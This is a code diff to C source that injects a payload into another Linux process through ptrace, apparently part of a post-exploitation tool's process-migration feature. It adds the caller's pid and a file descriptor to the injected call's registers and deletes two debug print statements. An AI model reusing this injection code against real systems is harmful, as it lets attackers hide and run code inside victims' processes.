@@ -160,7 +160,6 @@ void get_process_writable_sections(int pid, writable_section_ptr process_section
     if(section_count >= 255)
       break;
     
-    printf("Writable section found at: %lx - %lx\n", start_address, end_address);
   }
   
   free(maps_handler);
@@ -316,7 +315,7 @@ long remote_allocate(int pid, size_t size, writable_section_ptr process_sections
 
 }
 
-int remote_call_payload(int pid, long payload_address, long stub_address)
+int remote_call_payload(int pid, long payload_address, long stub_address, int fd)
 {
 	int status = 0;			
 	struct user_regs_struct saved_regs = { 0 };
@@ -335,6 +334,8 @@ int remote_call_payload(int pid, long payload_address, long stub_address)
 	regs.rsp	= saved_regs.rsp+0x100;
 	regs.rbp	= saved_regs.rbp;
 	regs.r9		= payload_address;
+	regs.r10	= getpid();
+	regs.r11	= fd;
 
 	ptrace(PTRACE_SETREGS, pid, NULL, &regs);
 	
@@ -352,7 +353,7 @@ int remote_call_payload(int pid, long payload_address, long stub_address)
 	return 0;
 }
 
-int migrate(int pid, char * migrate_stub, size_t migrate_stub_length, char * payload, size_t payload_length, const char * uuid)
+int migrate(int pid, char * migrate_stub, size_t migrate_stub_length, char * payload, size_t payload_length, const char * uuid, int fd)
 {
 	struct user_regs_struct regs;
 	long payload_address = 0;
@@ -381,7 +382,7 @@ int migrate(int pid, char * migrate_stub, size_t migrate_stub_length, char * pay
 	}
 
 	
-	if( remote_call_payload(pid, payload_address, migrate_stub_address) == 0)
+	if( remote_call_payload(pid, payload_address, migrate_stub_address,fd) == 0)
 	{
 		ptrace(PTRACE_DETACH, pid, NULL, NULL);
 		return 0;
@@ -391,7 +392,6 @@ int migrate(int pid, char * migrate_stub, size_t migrate_stub_length, char * pay
 	waitpid(pid, NULL, 0);
     	if(ptrace(PTRACE_DETACH, pid, NULL, NULL) != 0)
 	{
-		printf("Failed to detach from process %d\n", pid);
 		return 0;
 	}
 
